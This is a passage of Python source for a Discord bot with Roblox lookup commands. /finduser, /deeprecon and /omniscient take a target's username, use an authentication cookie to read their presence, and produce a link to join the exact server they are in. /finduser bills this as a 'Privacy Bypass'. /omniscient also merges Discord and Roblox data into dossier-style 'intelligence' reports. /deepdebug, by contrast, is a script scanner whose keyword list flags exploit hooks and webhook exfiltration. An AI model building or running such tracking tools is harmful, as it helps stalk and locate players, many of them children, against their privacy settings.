    job_id="Optional specific server Job ID / Access Code",
)
async def robloxlink(
    interaction: discord.Interaction, place_id: str, job_id: str = None
):
  await interaction.response.defer(thinking=False)

  if not place_id.isdigit():
    await interaction.followup.send(
        "❌ Please provide a valid numeric Roblox Place ID.", ephemeral=True
    )
    return

  game_url = f"https://www.roblox.com/games/{place_id}"

  embed = discord.Embed(
      title="🎮 ROBLOX GAME JOIN LINK",
      description=(
          "Click the button or link below to launch Roblox and join the game session."
      )[:4000],
      color=0x57F287,
      timestamp=datetime.datetime.now(datetime.timezone.utc),
  )

  embed.add_field(name="📌 Place ID", value=f"`{place_id}`"[:1024], inline=True)
  if job_id:
    embed.add_field(name="🔑 Server Job ID", value=f"`{job_id}`"[:1024], inline=True)
    game_url += f"?privateServerLinkCode={job_id}"

  embed.add_field(
      name="🔗 Direct Access Link",
      value=f"[Click Here to Join Game]({game_url})"[:1024],
      inline=False,
  )
  embed.set_footer(
      text=f"Game Link Dispatcher • Generated by {interaction.user.name}"[:2048]
  )

  await interaction.followup.send(embed=embed)


# ==========================================
# COMMAND 7: /finduser
# ==========================================
@bot.tree.command(
    name="finduser",
    description="Finds a Roblox user and generates an instant direct-join link to their exact server.",
)
@app_commands.describe(username="The exact Roblox username of the target player")
async def finduser(interaction: discord.Interaction, username: str):
  await interaction.response.defer(thinking=True, ephemeral=True)

  cookie = os.getenv("ROBLOX_COOKIE")
  headers = {"Cookie": f".ROBLOSECURITY={cookie}"} if cookie else {}

  async with aiohttp.ClientSession(headers=headers) as session:
    payload = {"usernames": [username], "excludeBannedUsers": True}
    async with session.post(
        "https://users.roblox.com/v1/usernames/users", json=payload
    ) as resp:
      if resp.status != 200:
        await interaction.followup.send(
            "❌ Roblox API rate limit or outage encountered while querying the registry.",
            ephemeral=True,
        )
        return
      data = await resp.json()
      users = data.get("data", [])
      if not users:
        await interaction.followup.send(
            f"❌ Could not locate a user named **'{username}'** on Roblox. Check spelling.",
            ephemeral=True,
        )
        return

      user_info = users[0]
      user_id = user_info["id"]
      real_name = user_info["name"]
      display_name = user_info.get("displayName", real_name)

    presence_payload = {"userIds": [user_id]}
    async with session.post(
        "https://presence.roblox.com/v1/presence/users", json=presence_payload
    ) as resp:
      if resp.status != 200:
        await interaction.followup.send(
            "❌ Failed to query Roblox Presence API.", ephemeral=True
        )
        return
      presence_data = await resp.json()
      presence_list = presence_data.get("userPresences", [])
      if not presence_list:
        await interaction.followup.send(
            "❌ User presence data is completely unavailable from Roblox.",
            ephemeral=True,
        )
        return

      presence = presence_list[0]
      user_status = presence.get("userPresenceType", 0)
      game_id = presence.get("gameId")
      place_id = presence.get("placeId")

  status_map = {
      0: "🔴 Offline",
      1: "🌐 On Website",
      2: "🎮 In Game",
      3: "🛠️ In Studio",
  }
  status_string = status_map.get(user_status, "❓ Unknown")

  embed = discord.Embed(
      title=f"🔎 {display_name} (@{real_name})",
      color=0x57F287 if user_status == 2 else 0xFEE75C,
      timestamp=datetime.datetime.now(datetime.timezone.utc),
  )

  embed.add_field(name="Status", value=status_string, inline=True)
  embed.add_field(name="User ID", value=str(user_id), inline=True)

  view = discord.ui.View()
  if user_status == 2 and place_id and game_id:
    auto_join_url = f"https://www.roblox.com/games/start?placeId={place_id}&gameInstanceId={game_id}"
    embed.add_field(
        name="Server Action",
        value=(
            "🔓 **Privacy Bypass Active:** [Click to Launch Into Same Server]"
            f"({auto_join_url})"
        ),
        inline=False,
    )
    view.add_item(
        discord.ui.Button(
            label="Auto-Join Server",
            url=auto_join_url,
            style=discord.ButtonStyle.link,
        )
    )
  elif user_status == 2 and place_id:
    fallback_url = f"https://www.roblox.com/games/{place_id}"
    embed.add_field(
        name="Server Action",
        value=(
            "⚠️ **Privacy Restricted:** User is in-game, but privacy settings"
            f" hide their specific instance. [Open Universe]({fallback_url})"
        ),
        inline=False,
    )
    view.add_item(
        discord.ui.Button(
            label="Open Universe",
            url=fallback_url,
            style=discord.ButtonStyle.link,
        )
    )
  else:
    embed.add_field(
        name="Activity",
        value=(
            "Target is not currently inside a public joinable session or their presence is hidden."
        ),
        inline=False,
    )

  profile_url = f"https://www.roblox.com/users/{user_id}/profile"
  view.add_item(
      discord.ui.Button(
          label="View Profile", url=profile_url, style=discord.ButtonStyle.link
      )
  )

  embed.set_footer(text=f"Requested by {interaction.user.name}")
  await interaction.followup.send(embed=embed, view=view, ephemeral=True)


# ==========================================
# COMMAND 8: /deeprecon
# ==========================================
@bot.tree.command(
    name="deeprecon",
    description="Performs an advanced multi-vector cross-platform deep trace on a Roblox user.",
)
@app_commands.describe(username="The exact Roblox username to execute deep telemetry on")
async def deeprecon(interaction: discord.Interaction, username: str):
  await interaction.response.defer(thinking=True, ephemeral=True)

  cookie = os.getenv("ROBLOX_COOKIE")
  headers = {"Cookie": f".ROBLOSECURITY={cookie}"} if cookie else {}

  async with aiohttp.ClientSession(headers=headers) as session:
    payload = {"usernames": [username], "excludeBannedUsers": True}
    async with session.post("https://users.roblox.com/v1/usernames/users", json=payload) as resp:
      if resp.status != 200:
        raise Exception("Failed to query Roblox user registry.")
      data = await resp.json()
      users = data.get("data", [])
      if not users:
        raise ValueError(f"Target '{username}' does not exist or is banned.")

      u_info = users[0]
      uid = u_info["id"]
      real_n = u_info["name"]
      disp_n = u_info.get("displayName", real_n)
      is_banned = u_info.get("isBanned", False)

    async with session.get(f"https://users.roblox.com/v1/users/{uid}") as resp:
      meta = await resp.json()
      created_str = meta.get("created", "")
      description = meta.get("description", "")

    async with session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false") as resp:
      thumb_data = await resp.json()
      headshot_url = thumb_data.get("data", [{}])[0].get("imageUrl", None)

    async with session.post("https://presence.roblox.com/v1/presence/users", json={"userIds": [uid]}) as resp:
      p_data = await resp.json()
      pres = p_data.get("userPresences", [{}])[0]
      status_type = pres.get("userPresenceType", 0)
      place_id = pres.get("placeId")
      game_id = pres.get("gameId")

  try:
    reg_dt = datetime.datetime.fromisoformat(created_str.replace("Z", "+00:00"))
    age_days = (datetime.datetime.now(datetime.timezone.utc) - reg_dt).days
  except Exception:
    age_days = 0
    reg_dt = datetime.datetime.now(datetime.timezone.utc)

  threat_score = 0
  flags = []

  if is_banned:
    flags.append("🛑 **Account Terminated:** Roblox has banned this entity.")
    threat_score += 20
  if age_days < 7:
    flags.append("🚨 **Infant Account:** Registered less than a week ago.")
    threat_score += 5
  if len(description) > 300 and ("discord.gg/" in description.lower() or "t.co" in description.lower()):
    flags.append("⚠️ **External Link Vector:** Bio contains outbound redirection links.")
    threat_score += 3

  if not flags:
    flags.append("✅ Nominal telemetry profile verified.")

  embed = discord.Embed(
      title=f"⚡ DEEP RECON: {disp_n}",
      description=f"Multi-layered intelligence sweep for `@{real_n}` (ID: `{uid}`)",
      color=0xED4245 if threat_score > 5 else 0x57F287,
      timestamp=datetime.datetime.now(datetime.timezone.utc),
  )

  if headshot_url:
    embed.set_thumbnail(url=headshot_url)

  embed.add_field(
      name="📅 Account Age",
      value=(
          f"• **Age:** `{age_days:,} days old`\n• **Registered:**"
          f" `{reg_dt.strftime('%Y-%m-%d')}`"
      ),
      inline=True,
  )
  embed.add_field(name="🛡️ Threat Index", value=f"`{threat_score}/25` score", inline=True)
  embed.add_field(name="📝 Bio Length", value=f"`{len(description)} chars`", inline=True)

  embed.add_field(name="🔍 Deep Heuristics", value="\n".join([f"› {f}" for f in flags]), inline=False)

  view = discord.ui.View()
  if status_type == 2 and place_id and game_id:
    auto_url = f"https://www.roblox.com/games/start?placeId={place_id}&gameInstanceId={game_id}"
    view.add_item(discord.ui.Button(label="Auto-Join Exact Server", url=auto_url, style=discord.ButtonStyle.link))

  view.add_item(discord.ui.Button(label="Open Roblox Profile", url=f"https://www.roblox.com/users/{uid}/profile", style=discord.ButtonStyle.link))

  embed.set_footer(text=f"Deep Recon Module • Executed by {interaction.user.name}")
  await interaction.followup.send(embed=embed, view=view, ephemeral=True)


# ==========================================
# COMMAND 9: /omniscient
# ==========================================
@bot.tree.command(
    name="omniscient",
    description="🔥 Maximum-power cross-platform sweep combining Discord & Roblox intelligence.",
)
@app_commands.describe(query="Discord User ID (18-digit) or Exact Roblox Username to investigate")
async def omniscient(interaction: discord.Interaction, query: str):
  await interaction.response.defer(thinking=True, ephemeral=True)
  now = datetime.datetime.now(datetime.timezone.utc)
  risk_score = 0
  flags = []

  discord_data = None
  roblox_data = None

  cookie = os.getenv("ROBLOX_COOKIE")
  headers = {"Cookie": f".ROBLOSECURITY={cookie}"} if cookie else {}

  async with aiohttp.ClientSession(headers=headers) as session:
    if query.isdigit() and len(query) >= 16:
      try:
        user = await bot.fetch_user(int(query))
        created_at = user.created_at
        age_days = (now - created_at).days
        raw_name = user.name
        display_name = user.display_name

        if age_days < 3:
          flags.append("🚨 **Discord Velocity Critical:** Account created < 3 days ago.")
          risk_score += 5
        elif age_days < 14:
          flags.append("⚠️ **Discord Velocity Elevated:** Account created < 2 weeks ago.")
          risk_score += 2

        if user.avatar is None:
          flags.append("⚠️ **Discord Asset Void:** No default avatar history.")
          risk_score += 1

        if re.search(r"[\u200b\u200c\u200d\u2060\ufeff\u202e]", raw_name):
          flags.append("🚨 **Typography Exploit:** Hidden glyphs or RTL overrides found in handle.")
          risk_score += 8

        if user.public_flags.spammer:
          flags.append("🛑 **Global Flag:** Marked as a spammer entity by Discord.")
          risk_score += 15

        discord_data = {
            "name": raw_name,
            "display": display_name,
            "id": user.id,
            "age": age_days,
            "created": created_at.strftime("%Y-%m-%d"),
            "avatar": user.avatar.url if user.avatar else None,
        }
      except discord.NotFound:
        pass

    try:
      payload = {"usernames": [query], "excludeBannedUsers": False}
      async with session.post("https://users.roblox.com/v1/usernames/users", json=payload) as resp:
        if resp.status == 200:
          data = await resp.json()
          users = data.get("data", [])
          if users:
            u_info = users[0]
            uid = u_info["id"]
            real_n = u_info["name"]
            disp_n = u_info.get("displayName", real_n)
            is_banned = u_info.get("isBanned", False)

            async with session.get(f"https://users.roblox.com/v1/users/{uid}") as r_meta:
              meta = await r_meta.json()
              reg_str = meta.get("created", "")
              bio = meta.get("description", "")

            async with session.post("https://presence.roblox.com/v1/presence/users", json={"userIds": [uid]}) as r_pres:
              p_data = await r_pres.json()
              pres = p_data.get("userPresences", [{}])[0]
              status_type = pres.get("userPresenceType", 0)
              place_id = pres.get("placeId")
              game_id = pres.get("gameId")

            async with session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false") as r_thumb:
              thumb_data = await r_thumb.json()
              headshot = thumb_data.get("data", [{}])[0].get("imageUrl") if thumb_data.get("data") else None

            reg_dt = datetime.datetime.fromisoformat(reg_str.replace("Z", "+00:00")) if reg_str else now
            r_age_days = (now - reg_dt).days

            if is_banned:
              flags.append("🛑 **Roblox Terminated:** Target is banned.")
              risk_score += 20
            if r_age_days < 7:
              flags.append("🚨 **Roblox Infant Account:** Created less than 7 days ago.")
              risk_score += 4
            if "discord.gg/" in bio.lower() or "t.co" in bio.lower():
              flags.append("⚠️ **External Phishing Vector:** Outbound links in Roblox bio.")
              risk_score += 3

            roblox_data = {
                "id": uid,
                "real": real_n,
                "disp": disp_n,
                "age": r_age_days,
                "created": reg_dt.strftime("%Y-%m-%d"),
                "banned": is_banned,
                "status": status_type,
                "place_id": place_id,
                "game_id": game_id,
                "headshot": headshot,
                "bio_len": len(bio),
            }
    except Exception:
      pass

  if not discord_data and not roblox_data:
    await interaction.followup.send(f"❌ Could not resolve intelligence profile for query `{query}` on either Discord or Roblox.", ephemeral=True)
    return

  if not flags:
    flags.append("✅ Omniscient baseline verified. No critical threats found.")

  threat_class = "CRITICAL THREAT" if risk_score >= 10 else ("ELEVATED RISK" if risk_score >= 4 else "SECURE / NOMINAL")
  color = 0xED4245 if risk_score >= 10 else (0xFEE75C if risk_score >= 4 else 0x57F287)

  embed = discord.Embed(
      title="⚡ OMNISCIENT INTELLIGENCE SWEEP",
      description=f"Unified cross-platform report for target query: `{query}`",
      color=color,
      timestamp=now,
  )

  if discord_data:
    embed.add_field(
        name="💬 Discord Profile Node",
        value=(
            f"• **User:** `{discord_data['name']}`\n• **Age:**"
            f" `{discord_data['age']} days`\n• **Registered:**"
            f" `{discord_data['created']}`"
        )[:1024],
        inline=False,
    )
    if discord_data["avatar"]:
      embed.set_thumbnail(url=discord_data["avatar"])

  if roblox_data:
    status_map = {0: "Offline", 1: "On Website", 2: "In Game", 3: "In Studio"}
    embed.add_field(
        name="🎮 Roblox Profile Node",
        value=(
            f"• **Account:** `@{roblox_data['real']}`"
            f" (`{roblox_data['disp']}`)\n• **ID:** `{roblox_data['id']}`\n•"
            f" **Age:** `{roblox_data['age']} days`\n• **Status:**"
            f" `{status_map.get(roblox_data['status'], 'Unknown')}`\n• **Terminated:**"
            f" `{str(roblox_data['banned']).upper()}`"
        )[:1024],
        inline=False,
    )
    if roblox_data["headshot"] and not discord_data:
      embed.set_thumbnail(url=roblox_data["headshot"])

  embed.add_field(
      name="📊 Consolidated Risk Metrics",
      value=(
          f"• **Classification:** `{threat_class}`\n• **Composite Index:**"
          f" `{risk_score}/30`"
      )[:1024],
      inline=False,
  )
  embed.add_field(
      name="🔍 Automated Heuristic Diagnostics",
      value="\n".join([f"› {f}" for f in flags])[:1024],
      inline=False,
  )

  view = discord.ui.View()
  if roblox_data and roblox_data["status"] == 2 and roblox_data["place_id"] and roblox_data["game_id"]:
    auto_url = f"https://www.roblox.com/games/start?placeId={roblox_data['place_id']}&gameInstanceId={roblox_data['game_id']}"
    view.add_item(discord.ui.Button(label="Auto-Join Roblox Server", url=auto_url, style=discord.ButtonStyle.link))
  if roblox_data:
    view.add_item(discord.ui.Button(label="Open Roblox Profile", url=f"https://www.roblox.com/users/{roblox_data['id']}/profile", style=discord.ButtonStyle.link))

  embed.set_footer(text=f"Omniscient Core • Executed by {interaction.user.name}")
  await interaction.followup.send(embed=embed, view=view, ephemeral=True)


# ==========================================
# COMMAND 10: /deepdebug
# ==========================================
@bot.tree.command(
    name="deepdebug",
    description="Performs an advanced mathematical entropy and obfuscation scan on code/scripts.",
)
@app_commands.describe(file="Upload a script file", url="Or provide a raw text/paste link")
async def deepdebug(
    interaction: discord.Interaction,
    file: discord.Attachment = None,
    url: str = None,
):
  await interaction.response.defer(thinking=True, ephemeral=True)
  if not file and not url:
    await interaction.followup.send("❌ Provide a file upload or link to analyze.", ephemeral=True)
    return

  try:
    if file:
      content = (await file.read()).decode("utf-8", errors="ignore")
      source = file.filename
    else:
      async with aiohttp.ClientSession() as session:
        async with session.get(url.replace("pastebin.com/", "pastebin.com/raw/")) as resp:
          content = await resp.text()
          source = url
  except Exception as e:
    await interaction.followup.send(f"❌ Failed to retrieve script payload: `{e}`", ephemeral=True)
    return

  if len(content) > 0:
    prob = [float(content.count(c)) / len(content) for c in set(list(content))]
    entropy = -sum([p * math.log(p, 2) for p in prob])
  else:
    entropy = 0

  risk_score = 0
  flags = []

  if entropy > 5.5:
    flags.append(f"🚨 **High Entropy Pack (`{entropy:.2f}`):** Code is heavily obfuscated or binary-packed.")
    risk_score += 8
  elif entropy > 4.5:
    flags.append(f"⚠️ **Moderate Entropy (`{entropy:.2f}`):** Encoded strings or variable scrambling detected.")
    risk_score += 4

  lower = content.lower()
  if any(k in lower for k in ["getgenv", "hookfunction", "getrawmetatable", "setreadonly", "syn.request"]):
    flags.append("🛑 **Executor Hook Signature:** Contains high-privilege exploit functions.")
    risk_score += 10
  if "discord.com/api/webhooks" in lower:
    flags.append("⚠️ **Data Exfiltration:** Webhook logging links embedded inside code.")
    risk_score += 6

  if not flags:
    flags.append("✅ Clean syntax structure. Low packing indicators.")

  embed = discord.Embed(
      title="🔬 HYPER-ENTROPY SCRIPT FORENSICS",
      description=f"Deep analysis complete for source: `{source}`",
      color=0xED4245 if risk_score > 8 else 0x57F287,
      timestamp=datetime.datetime.now(datetime.timezone.utc),
  )
  embed.add_field(
      name="📊 Metrics",
      value=f"• **Entropy Level:** `{entropy:.2f}`\n• **Risk Score:** `{risk_score}/25`\n• **Size:** `{len(content):,} chars`"[:1024],
      inline=False,
  )
  embed.add_field(
      name="🔍 Diagnostic Results",
      value="\n".join([f"› {f}" for f in flags])[:1024],
      inline=False,
  )

  embed.set_footer(text=f"Entropy Forensics • Executed by {interaction.user.name}")
  await interaction.followup.send(embed=embed, ephemeral=True)


# Run Bot
bot.run(TOKEN)
